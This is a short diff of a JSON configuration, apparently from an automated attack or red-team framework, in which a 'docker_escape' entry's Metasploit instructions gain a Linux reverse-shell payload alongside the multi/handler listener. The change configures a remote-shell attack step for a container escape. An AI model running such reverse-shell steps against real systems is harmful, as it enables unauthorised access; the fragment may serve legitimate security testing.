@@ -8,7 +8,7 @@
         "config": ""
       },
       "docker_escape": {
-        "instructions": "use exploit/multi/handler \nset target {} \nset LPORT {LPORT}\n exploit",
+        "instructions": "use exploit/multi/handler \nuse payload linux/x86/shell_reverse_tcp \nset target {} \nset LPORT {LPORT}\n exploit",
         "attack_type": "MetasploitAttack",
         "wait_time": "50",
         "config": ""
